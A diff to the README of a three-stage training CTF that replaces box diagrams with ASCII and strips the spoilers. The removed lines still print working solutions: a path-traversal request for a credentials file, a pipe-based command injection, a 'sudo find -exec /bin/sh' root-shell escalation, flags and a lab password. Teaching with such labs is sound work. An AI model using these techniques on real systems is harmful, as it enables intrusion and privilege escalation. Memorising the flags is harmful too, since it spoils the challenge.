@@ -14,27 +14,27 @@ docker-compose up --build
 ## Architecture
 
 ```
-┌─────────────────────────────────────────────────────────────────┐
-│                         Frontend (Next.js)                       │
-│                         http://localhost:3000                    │
-├─────────────────────────────────────────────────────────────────┤
-│                              │                                   │
-│         ┌────────────────────┼────────────────────┐              │
-│         │                    │                    │              │
-│         ▼                    ▼                    │              │
-│  ┌──────────────┐    ┌──────────────┐             │              │
-│  │ Web Traversal│    │   Gateway    │◄────────────┘              │
-│  │   (Flask)    │    │  (Node.js)   │                            │
-│  │  Port 5000   │    │  Port 4000   │                            │
-│  └──────────────┘    └──────┬───────┘                            │
-│                             │                                    │
-│                             │ Docker API                         │
-│                             ▼                                    │
-│                      ┌──────────────┐                            │
-│                      │Shell Backend │                            │
-│                      │  (Ubuntu)    │                            │
-│                      └──────────────┘                            │
-└─────────────────────────────────────────────────────────────────┘
++----------------------------------------------------------------+
+|                         Frontend (Next.js)                       |
+|                         http://localhost:3000                    |
++----------------------------------------------------------------+
+|                              |                                   |
+|         +--------------------+--------------------+              |
+|         |                    |                    |              |
+|         v                    v                    |              |
+|  +--------------+    +--------------+             |              |
+|  | Web Traversal|    |   Gateway    |<------------+              |
+|  |   (Flask)    |    |  (Node.js)   |                            |
+|  |  Port 5000   |    |  Port 4000   |                            |
+|  +--------------+    +------+-------+                            |
+|                             |                                    |
+|                             | Docker API                         |
+|                             v                                    |
+|                      +--------------+                            |
+|                      |Shell Backend |                            |
+|                      |  (Ubuntu)    |                            |
+|                      +--------------+                            |
++----------------------------------------------------------------+
 ```
 
 ## Challenge Stages
@@ -45,14 +45,7 @@ docker-compose up --build
 
 **Vulnerability:** The file path is not sanitized, allowing `../` sequences.
 
-**Goal:** Read `/data/secrets/credentials.txt`
-
-**Solution:**
-```
-GET /api/files/../../../data/secrets/credentials.txt
-```
-
-**Flag 1:** `FLAG{p4th_tr4v3rs4l_0pen_d00r}`
+**Goal:** Read `/data/secrets/credentials.txt` to obtain shell credentials.
 
 ---
 
@@ -60,16 +53,9 @@ GET /api/files/../../../data/secrets/credentials.txt
 
 **Target:** Restricted Shell
 
-**Vulnerability:** The shell checks only the first command word but uses `shell=True`, allowing pipe operators.
+**Vulnerability:** The shell checks only the first command word but allows shell operators.
 
 **Goal:** Read `/home/ctf_user/flag2.txt`
-
-**Solution:**
-```bash
-help | cat /home/ctf_user/flag2.txt
-```
-
-**Flag 2:** `FLAG{c0mm4nd_1nj3ct10n_p1p3_dr34m}`
 
 ---
 
@@ -77,32 +63,11 @@ help | cat /home/ctf_user/flag2.txt
 
 **Target:** Root access via misconfigured sudo
 
-**Vulnerability:** `ctf_user` can run `/usr/bin/find` as root without a password.
+**Vulnerability:** A common GTFOBins technique can be used to escalate privileges.
 
 **Goal:** Read `/root/root_flag.txt`
 
-**Solution:**
-```bash
-# First, discover the sudo permissions
-help | sudo -l
-
-# Use find's -exec to read the flag
-help | sudo find /root -name root_flag.txt -exec cat {} \;
-
-# Or spawn a root shell
-help | sudo find . -exec /bin/sh \; -quit
-```
-
-**Flag 3:** `FLAG{gtf0_f1nd_r00t_4ccess_2026}`
-
 ---
-
-## Credentials
-
-Username: `ctf_user`
-Password: `r3str1ct3d_2026`
-
-(Discovered via Stage 1)
 
 ## Development
 
@@ -127,22 +92,27 @@ docker-compose up web-traversal shell-backend
 
 ```
 CyberXperience2026/
-├── docker-compose.yml
-├── frontend/                 # Next.js web interface
-│   ├── app/
-│   ├── components/
-│   └── Dockerfile
-├── gateway/                  # Socket.io terminal bridge
-│   ├── server.js
-│   └── Dockerfile
-└── services/
-    ├── web-traversal/        # Flask API (Stage 1)
-    │   ├── app.py
-    │   └── Dockerfile
-    └── shell-backend/        # Ubuntu shell (Stage 2 & 3)
-        ├── restricted_shell.py
-        ├── ctf_user_sudoers
-        └── Dockerfile
++-- docker-compose.yml
++-- flags.json               # Centralized flag configuration
++-- frontend/                # Next.js web interface
+|   +-- app/
+|   +-- components/
+|   +-- hooks/
+|   +-- lib/
+|   +-- Dockerfile
++-- gateway/                 # Socket.io terminal bridge
+|   +-- server.js
+|   +-- Dockerfile
++-- services/
+    +-- web-traversal/       # Flask API (Stage 1)
+    |   +-- app.py
+    |   +-- create_secrets.sh
+    |   +-- Dockerfile
+    +-- shell-backend/       # Ubuntu shell (Stage 2 & 3)
+        +-- restricted_shell.py
+        +-- setup_flags.sh
+        +-- ctf_user_sudoers
+        +-- Dockerfile
 ```
 
 ## Educational Notes
